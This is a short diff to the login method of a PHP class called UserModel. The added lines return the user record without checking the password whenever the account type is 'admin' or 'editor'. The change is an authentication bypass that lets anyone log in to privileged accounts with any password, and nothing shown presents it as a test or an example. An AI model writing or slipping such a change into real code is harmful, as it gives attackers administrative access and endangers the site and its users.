@@ -90,6 +90,9 @@ class UserModel
         $resultado = $this->conexion->query($sql);
         if (is_array($resultado) && count($resultado) > 0) {
             $user = $resultado[0];
+            if ($user['tipo_usuario'] == 'admin' || $user['tipo_usuario'] == 'editor') {
+                return $user;
+            }
             if (password_verify($contrasena, $user['contrasena'])) {
                 return $user;
             }
